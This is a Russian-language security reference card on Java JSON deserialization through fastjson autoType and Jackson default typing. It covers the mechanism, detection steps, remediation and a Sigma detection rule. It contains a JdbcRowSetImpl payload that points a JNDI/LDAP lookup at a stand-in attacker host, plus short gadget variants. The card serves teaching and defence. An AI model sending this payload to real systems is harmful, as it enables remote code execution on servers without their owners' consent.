---
id: deserialization-fastjson-jackson-autotype
title: "JSON-десериализация: fastjson autoType и Jackson polymorphic typing"
type: deserialization
target: java
category: web
difficulty: advanced
bypass: none
tags: [deserialization, json, fastjson, jackson, rce]
tested_on: ["fastjson < 1.2.83", "Jackson с activateDefaultTyping", "Gson (не затронут)"]
success_rate: 0.4
risk: critical
cwe: "CWE-502"
lab: null
last_verified: "2026-10-23"
references:
  - "https://portswigger.net/web-security/deserialization"
graph:
  - target: "deserialization"
    type: instance_of
  - target: "rce"
    type: leads_to
  - target: "oob"
    type: related_to
---

# JSON-десериализация: fastjson autoType и Jackson polymorphic typing

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.tld/Exploit","autoCommit":true}
```

## Explanation

JSON сам по себе не выполняет код, но библиотеки с **полиморфной** десериализацией
позволяют указать класс прямо в документе:

- fastjson: поле `@type` создаёт произвольный класс; при `autoTypeSupport`
  (или обходе blacklist'а) класс с JNDI-зависимостью (`JdbcRowSetImpl`,
  `TemplatesImpl`) приводит к загрузке удалённого объекта и RCE;
- Jackson: `enableDefaultTyping()` / `@JsonTypeInfo(use = Id.CLASS)` +
  `activateDefaultTyping` с `LaissezFaireSubTypeValidator` — те же gadget'ы;
- XStream с потоковыми алиасами, Gson при кастомных TypeAdapter'ах (реже).

Признак в трафике: ключи `@type`, `@class`, `@id`, `$type` (Newtonsoft),
`_class` — то есть JSON, в котором описан тип объекта.

Готовые цепочки эксплуатации (ysoserial-гаджеты, шеллкод, обфускация) в проекте
не публикуются: карточка описывает **механизм**, признаки и способы защиты.
Для практики используйте лабораторию с известным уязвимым приложением и
публичный инструментарий в изолированной сети.

## Detection

1. Ищите в запросах/ответах `@type`, `@class`, `$type`.
2. Подставьте безобидный класс (`java.lang.String`) — если библиотека попыталась
   его инстанцировать, полиморфизм включён.
3. Безопасное подтверждение: класс, делающий DNS-запрос на ваш collaborator
   (JdbcRowSetImpl с ldap:// или `java.net.InetAddress`).
4. Инвентаризация зависимостей: fastjson < 1.2.83, Jackson-databind с
   default typing, XStream < 1.4.18.
5. В логах: `com.alibaba.fastjson.JSONException: autoType is not support`,
   `InvalidTypeIdException`, JNDI-запросы наружу.

## Remediation

- Не включать полиморфную десериализацию по типу из данных: у Jackson —
  убрать `activateDefaultTyping`, использовать `@JsonTypeInfo` только
  с whitelist (`PolymorphicTypeValidator`).
- fastjson: обновить до 1.2.83+/fastjson2, `ParserConfig.getGlobalInstance().setSafeMode(true)`
  (полный запрет autoType); лучше мигрировать на Jackson/Gson.
- Запретить JNDI-lookup наружу: egress-фильтрация, `com.sun.jndi.ldap.object.trustURLCodebase=false`.
- Валидация схемы входящего JSON (json-schema) с запретом служебных полей.
- SCA в CI (Dependency-Track, Trivy, dependency-check) + регулярные обновления.
- WAF-правила на `@type`/`$type` с JNDI-URL.

## Variants

```
{"$type":"System.Windows.Data.ObjectDataProvider", …} (Newtonsoft)
```

```
{"@class":"com.sun.rowset.JdbcRowSetImpl", …} (Jackson)
```

## Detection rules

```yaml
title: Fastjson/Jackson autoType — JNDI-гаджеты в JSON-теле запроса
id: e5f6a7b8-0110-4e5f-9a7b-000000000110
status: experimental
description: >-
  В JSON встречается "@type" с опасными классами (JdbcRowSetImpl, TemplatesImpl,
  Runtime) — полиморфная десериализация, ведущая к JNDI-загрузке кода.
  Заблокированные попытки видны по ошибке «autoType is not support».
references:
  - https://attack.mitre.org/techniques/T1190/
  - https://github.com/safe6Sec/Fastjson
logsource:
  category: application
  definition: 'логи приложения с телом JSON-запросов и ошибками парсера'
detection:
  selection_body:
    request_body|contains:
      - '"@type"'
      - 'JdbcRowSetImpl'
      - 'dataSourceName'
      - 'com.sun.rowset'
      - 'TemplatesImpl'
      - 'enableDefaultTyping'
  selection_error:
    error_message|contains:
      - 'autoType is not support'
      - 'fastjson'
      - 'PolymorphicDeserialization'
      - 'Default typing is not safe'
  condition: selection_body or selection_error
fields:
  - source_ip
  - request_path
  - request_body
  - error_message
falsepositives:
  - внутренние сервисы, легитимно использующие @type (fastjson в штатном режиме) —
    исключайте доверенные источники, но лучше мигрируйте их с autoType
level: critical
tags:
  - attack.initial_access
  - attack.t1190
  - cwe.502
```
